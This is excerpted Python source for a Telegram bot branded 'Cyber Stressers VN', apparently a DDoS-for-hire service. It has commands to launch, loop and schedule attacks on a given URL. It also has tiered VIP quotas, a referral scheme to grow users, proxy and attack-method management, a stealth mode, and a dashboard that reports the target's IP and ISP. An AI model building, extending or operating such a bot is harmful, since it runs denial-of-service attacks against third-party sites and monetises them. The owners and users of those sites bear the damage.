...
BOT_USERNAME = "CyberStressersVN_Bot"  # 👈 Thay username bot của bạn vào đây (Không chứa chữ @)
...
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        ...
        c.execute('CREATE TABLE IF NOT EXISTS vip_users (user_id INTEGER PRIMARY KEY, package_name TEXT, custom_max_time INTEGER DEFAULT NULL, custom_quota INTEGER DEFAULT NULL, custom_cooldown INTEGER DEFAULT NULL, custom_max_concurrent INTEGER DEFAULT NULL)')
...
# 🔥 HÀM TỰ ĐỘNG GỬI FILE BACKUP DATABASE VỀ TELEGRAM CHO ADMIN GỐC
...
async def thong_tin_vip(update, context):
    ...
    if vip_cfg:
        ...
        await update.message.reply_text(
            "⚡️ ─── [ 𝘊𝘠𝘉𝘌𝘙 𝘚𝘛𝘙𝘌𝘚𝘚𘘗𘘗𘘗 𘘝𘘢 ] ─── ⚡️\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💎 <b>VIP ACCOUNT PROFILE</b>\n\n"
            f" ├── 🆔 <b>User ID:</b> <code>{user_id}</code>\n"
            f" ├── 📦 <b>Gói Hiện Tại:</b> <code>{vip_cfg['package']}</code>\n"
            f" ├── ⏳ <b>Thời Gian Max:</b> Tối đa <code>{vip_cfg['max_time']}s</code> / Lượt\n"
            f" ├── 🚀 <b>Kho Đạn Quota:</b> Còn <code>{vip_cfg['quota']}</code> lượt bắn\n"
            f" ├── 🔄 <b>Quyền Auto-Spam:</b> {spam_st}\n"
            f" ├── ⏰ <b>Quyền Đặt Lịch:</b> {sch_st}\n"
            f" ├── 📶 <b>Giới Hạn Băng Thông:</b> Tối đa <code>{vip_cfg['max_concurrent']}</code> luồng\n"
            f" ├── 👥 <b>Đã Giới Thiệu:</b> <code>{current_refs}</code> người\n"
            f" └── ❄️ <b>HỆ THỐNG LÀM MÁT:</b> Nghỉ <code>{vip_cfg['cooldown']}s</code> giữa các lượt\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 <i>Tài khoản của bạn đang giữ gói Đặc Quyền VIP cao cấp!</i>", 
            parse_mode='HTML'
        )
    else:
...
async def help_group(update, context):
    ...
    help_text = (
        "⚡️ ─── [ ⚡️ CYBER STRESSERS VN ⚡️ ] ─── ⚡️\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 𝑊𝑒𝑙𝑐𝑜𝑚𝑒, <code>{username}</code> [Operator]\n\n"
        "⚡️ [ MAIN ATTACK PANEL ]\n"
        " ├─ 🚀 <code>/attack</code>  » [ method ] [ url ] [ time ]\n"
        " ├─ 🔄 <code>/spam</code>    » [ method ] [ url ] [ time ]\n"
        " ├─ 🛑 <code>/stopspam</code>» Dừng vòng lặp spam\n"
        " ├─ ⏰ <code>/schedule</code>» [ HH:MM ] [ method ] [ url ] [ time ]\n"
        " ├─ 📝 <code>/schedule spam</code> » [ HH:MM ] ...\n"
        " ├─ 🗑 <code>/delschedule</code>» [ Mã Task ]\n"
        " └── 💀 <code>/pkill</code>   » Kiên quyết dừng hệ thống\n\n"
        "🛠 [ UTILITIES & SYSTEM ]\n"
        " ├─ 👤 <code>/me</code>      » Kiểm tra đặc quyền cá nhân\n"
        " ├─ 🔍 <code>/check</code>  » Quét trạng thái Host\n"
        " └─ 📋 <code>/methods</code>» Xem method tấn công\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🎁 [ SỰ KIỆN: GIỚI THIỆU ĐỔI VIP TỰ ĐỘNG ]\n"
        f"👉 Link ref của bạn: <code>{ref_link}</code>\n"
        f"💡 Tích đủ lượt giới thiệu để mở khóa gói đặc quyền VIP1 MIỄN PHÍ!\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🌐 𝑆𝑦𝑠𝑡𝑒𝑚 𝑆𝑡𝑎𝑡𝑢𝑠: ONLINE | 🔋 𝑇ℎ𝑟𝑒𝑎𝑑𝑠: 𝐴𝑐𝑡𝑖𝑣𝑒"
    )
...
async def dat_lich(update, context):
    ...
    loai_lich = "KÍCH HOẠT SPAM" if is_schedule_spam else "TẤN CÔNG THƯỜNG"
    ...
    try:
        while True:
            if loop_count > 1 and not is_admin(user_id):
                ...
                if vip_cfg:
                    if vip_cfg['quota'] <= 0:
                        try: await context.bot.send_message(user_id, "❌ <b>Hết Quota VIP! Tự động dừng.</b>", parse_mode='HTML')
                        except Exception: pass
                    ...
                    left_quota = check_and_update_member_quota(user_id)
                    if left_quota == -1:
                        try: await context.bot.send_message(user_id, "❌ <b>Hết hạn mức trong ngày! Tự động dừng.</b>", parse_mode='HTML')
                        except Exception: pass
                        if user_id in looping_tasks: del looping_tasks[user_id]
                        return
...
async def tao_choi(update, context):
    ...
    dashboard = (
        "⚡️ ─── [ CYBER STRESSERS VN ] ─── ⚡️\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>⚠️ KHAI HỎA MỤC TIÊU THÀNH CÔNG ⚠️</b>\n\n"
        f" ├── 👤 <b>Operator:</b> <code>@{escape(username)}</code> (ID: {user_id})\n"
        f" ├── 🎯 <b>Target Host:</b> <code>{url}</code>\n"
        f" ├── 💥 <b>Kỹ Thuật:</b> <code>{method_name.upper()}</code>\n"
        f" └── ⏳ <b>Kíp Nổ:</b> Duy trì <code>{attack_time}s</code>\n\n"
        "🛰 [ TRINH SÁT TÌNH BÁO ]\n"
        f" ├── 🌐 <b>Địa Chỉ IP:</b> <code>{ip}</code>\n"
        f" └── 🏢 <b>Nhà Mạng ISP:</b> <i>{escape(isp_info.get('isp', 'N/A'))}</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🕒 <b>𝑇𝑖𝑚𝑒𝑠𝑡𝑎𝑚𝑝:</b> <code>{get_thoi_gian_vn()}</code>"
    )
...
async def them_phuong_thuc(update, context):
    ...
    attack_time = 60
    if req_method not in ['GET', 'POST', 'NONE']: return await update.message.reply_text("⚠️ <b>Cú pháp sai loại method!</b>", parse_mode='HTML')
    if 'timeset' in context.args:
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except ValueError: return await update.message.reply_text("🔥 <b>Thời gian sai.</b>", parse_mode='HTML')
...
# 🔥 TÍNH NĂNG NHẬN VÀ GHI ĐÈ FILE DATABASE ĐỔI VPS / RE-START GITHUB ACTIONS
async def upload_db(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if update.message.document:
        if update.message.document.file_name == DB_FILE:
            ...
            # Ghi đè trực tiếp lên file hiện tại của VPS/GitHub
...
async def help_admin(update, context):
    ...
    msg = (
        "⚡️ ─── [ CYBER STRESSERS VN ] ─── ⚡️\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👑 <b>ROOT ADMINISTRATOR CORE PANEL</b>\n\n"
        "⚙️ [ QUẢN LÝ THỦ TRƯỞNG MASTER ]\n"
        " ├─ 🟢 <code>/on</code> | 🔴 <code>/off</code> (Trạng thái Bot)\n"
        " ├─ 👻 <code>/botro</code> (Bật/Tắt chế độ Tàng Hình)\n"
        " ├─ 🛑 <code>/pkill</code> (Hủy diệt tất cả Node gầm VPS)\n"
        " ├─ 📊 <code>/vps</code> (Xem % tải CPU & RAM tức thời)\n"
        " ├─ 📦 <code>/backup</code> (Yêu cầu gửi file .db về Tele)\n"
        " ├─ 📤 <code>/upload</code> (Ghi đè database.db mới lên)\n"
        " ├─ 👑 <code>/addadmin</code> | <code>/deladmin</code>\n"
        " └─ 🔓 <code>/allowprivate</code> | <code>/delprivate</code>\n\n"
        "📜 [ KIỂM TRA LỊCH SỬ ]\n"
        " ├─ 📈 <code>/logs</code> | 🗑 <code>/clearlogs</code>\n\n"
        "📂 [ DỮ LIỆU METHOD & PROXY ]\n"
        " ├─ 📊 <code>/proxies</code> | 📥 <code>/dlproxies</code>\n"
        " └── ➕ <code>/add</code> | ➖ <code>/del</code>\n\n"
        "👥 [ QUẢN LÝ THÀNH VIÊN VIP & GÓI ]\n"
        " ├─ 📦 <code>/setpackage</code> (Khởi tạo/Sửa gói VIP)\n"
        " ├─ 💎 <code>/vipuser [gói] [id]</code> (Gán gói VIP)\n"
        " ├─ ⚙️ <code>/editvip</code> (Sửa đè thông số cá nhân)\n"
        " └─ 🗑 <code>/delvip</code> (Hạ cấp về thường)\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
...
def make_handler(func, min_args, help_text, *extra_args):
    async def wrapper(update, context):
        if len(context.args) < min_args: return await update.message.reply_text(f"⚠️ <b>Lỗi:</b> {help_text}", parse_mode='HTML')
...
def main():
    ...
    app.add_handler(CommandHandler("addadmin", make_handler(quan_ly_admin, 1, "Cú pháp: /addadmin [id]", "add")))
    app.add_handler(CommandHandler("deladmin", make_handler(quan_ly_admin, 1, "Cú pháp: /deladmin [id]", "remove")))
    app.add_handler(CommandHandler("allowprivate", make_handler(quan_ly_chay_rieng, 1, "Cú pháp: /allowprivate [id]", "add")))
    app.add_handler(CommandHandler("delprivate", make_handler(quan_ly_chay_rieng, 1, "Cú pháp: /delprivate [id]", "remove")))
    ...
    # Đăng ký lệnh upload nhận tệp đính kèm văn bản .db
    ...
    app.add_handler(CommandHandler("vipuser", make_handler(quan_ly_vip_user, 2, "Cú pháp: /vipuser [tên_gói] [id]", "add")))
